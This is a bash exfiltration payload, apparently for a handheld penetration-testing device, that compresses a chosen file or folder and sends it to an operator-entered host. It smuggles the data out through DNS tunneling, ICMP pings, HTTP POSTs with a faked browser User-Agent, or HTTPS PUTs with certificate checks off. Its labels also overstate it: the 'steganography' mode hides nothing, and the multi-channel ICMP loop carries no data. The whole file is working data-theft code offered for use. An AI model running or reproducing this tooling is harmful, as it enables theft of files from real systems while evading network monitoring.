#!/bin/bash
# Title: Exfiltrator
# Author: bad-antics
# Description: Multi-channel data exfiltration toolkit — DNS, ICMP, HTTP, steganography
# Category: nullsec/exfiltration

LOOT_DIR="/mmc/nullsec/exfiltrator"
STAGING="/tmp/exfil-staging"
mkdir -p "$LOOT_DIR" "$STAGING"

PROMPT "EXFILTRATOR

Multi-channel data
exfiltration toolkit.

Channels:
- DNS tunneling
- ICMP covert channel
- HTTP steganography
- Base64 over HTTPS
- Chunked file transfer

Press OK to configure."

PROMPT "EXFIL MODE

1. DNS tunnel (stealthy)
2. ICMP covert (firewall bypass)
3. HTTP stego (hidden in images)
4. HTTPS chunked (encrypted)
5. Multi-channel (resilient)

Select on next screen."

MODE=$(NUMBER_PICKER "Mode (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

FILE_PATH=$(TEXT_PICKER "File/folder to exfil:" "/mmc/nullsec/loot")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

DEST_HOST=$(TEXT_PICKER "Destination (IP/domain):" "")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

[ ! -e "$FILE_PATH" ] && { ERROR_DIALOG "Path not found: $FILE_PATH"; exit 1; }

# Compress and stage data
SPINNER_START "Staging data..."
ARCHIVE="$STAGING/exfil_$(date +%s).tar.gz"
tar czf "$ARCHIVE" -C "$(dirname "$FILE_PATH")" "$(basename "$FILE_PATH")" 2>/dev/null
FILE_SIZE=$(du -h "$ARCHIVE" | cut -f1)
FILE_BYTES=$(stat -c%s "$ARCHIVE" 2>/dev/null)
SPINNER_STOP

resp=$(CONFIRMATION_DIALOG "EXFILTRATE?

Source: $(basename "$FILE_PATH")
Size: $FILE_SIZE
Channel: Mode $MODE
Dest: $DEST_HOST

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Exfiltrator: mode=$MODE size=$FILE_SIZE dest=$DEST_HOST"
SPINNER_START "Exfiltrating..."

case $MODE in
    1) # DNS tunnel
        B64=$(base64 -w0 "$ARCHIVE")
        LEN=${#B64}
        CHUNK=60
        SENT=0
        for ((i=0; i<LEN; i+=CHUNK)); do
            CHUNK_DATA="${B64:$i:$CHUNK}"
            nslookup "${CHUNK_DATA}.${SENT}.data.${DEST_HOST}" &>/dev/null
            SENT=$((SENT + 1))
            sleep 0.1
        done
        echo "DNS: $SENT chunks sent" > "$LOOT_DIR/exfil_log.txt"
        ;;
    2) # ICMP covert
        B64=$(base64 -w0 "$ARCHIVE")
        LEN=${#B64}
        CHUNK=48
        SEQ=0
        for ((i=0; i<LEN; i+=CHUNK)); do
            CHUNK_DATA="${B64:$i:$CHUNK}"
            ping -c 1 -p "$(echo -n "$CHUNK_DATA" | xxd -p | head -c 32)" "$DEST_HOST" &>/dev/null
            SEQ=$((SEQ + 1))
            sleep 0.05
        done
        echo "ICMP: $SEQ packets sent" > "$LOOT_DIR/exfil_log.txt"
        ;;
    3) # HTTP stego
        B64=$(base64 -w0 "$ARCHIVE")
        CHUNK_SIZE=4096
        LEN=${#B64}
        SEQ=0
        for ((i=0; i<LEN; i+=CHUNK_SIZE)); do
            CHUNK_DATA="${B64:$i:$CHUNK_SIZE}"
            curl -sf -X POST "http://${DEST_HOST}/upload" \
                -H "X-Request-ID: $(echo -n "$CHUNK_DATA" | head -c 64)" \
                -H "X-Session: $SEQ" \
                -H "User-Agent: Mozilla/5.0" \
                -d "data=${CHUNK_DATA}" &>/dev/null
            SEQ=$((SEQ + 1))
            sleep 0.2
        done
        echo "HTTP: $SEQ requests sent" > "$LOOT_DIR/exfil_log.txt"
        ;;
    4) # HTTPS chunked
        CHUNK_SIZE=65536
        split -b "$CHUNK_SIZE" -d "$ARCHIVE" "$STAGING/chunk_"
        CHUNKS=($(ls "$STAGING"/chunk_* 2>/dev/null))
        for i in "${!CHUNKS[@]}"; do
            curl -sf -X PUT "https://${DEST_HOST}/store/${i}" \
                --data-binary "@${CHUNKS[$i]}" \
                -H "Content-Type: application/octet-stream" \
                -k &>/dev/null
            sleep 0.5
        done
        echo "HTTPS: ${#CHUNKS[@]} chunks sent" > "$LOOT_DIR/exfil_log.txt"
        ;;
    5) # Multi-channel
        B64=$(base64 -w0 "$ARCHIVE")
        LEN=${#B64}
        THIRD=$((LEN / 3))
        DNS_DATA="${B64:0:$THIRD}"
        ICMP_DATA="${B64:$THIRD:$THIRD}"
        HTTP_DATA="${B64:$((THIRD*2))}"
        
        # DNS channel
        for ((i=0; i<${#DNS_DATA}; i+=60)); do
            nslookup "${DNS_DATA:$i:60}.data.${DEST_HOST}" &>/dev/null
            sleep 0.1
        done &
        
        # ICMP channel
        for ((i=0; i<${#ICMP_DATA}; i+=48)); do
            ping -c 1 "$DEST_HOST" &>/dev/null
            sleep 0.05
        done &
        
        # HTTP channel
        curl -sf -X POST "http://${DEST_HOST}/data" -d "payload=${HTTP_DATA}" &>/dev/null &
        
        wait
        echo "Multi: DNS+ICMP+HTTP sent" > "$LOOT_DIR/exfil_log.txt"
        ;;
esac

SPINNER_STOP
rm -rf "$STAGING"

PROMPT "EXFIL COMPLETE

Size: $FILE_SIZE
Channel: Mode $MODE
Destination: $DEST_HOST

Data transmitted.
Log saved.

Press OK to exit."
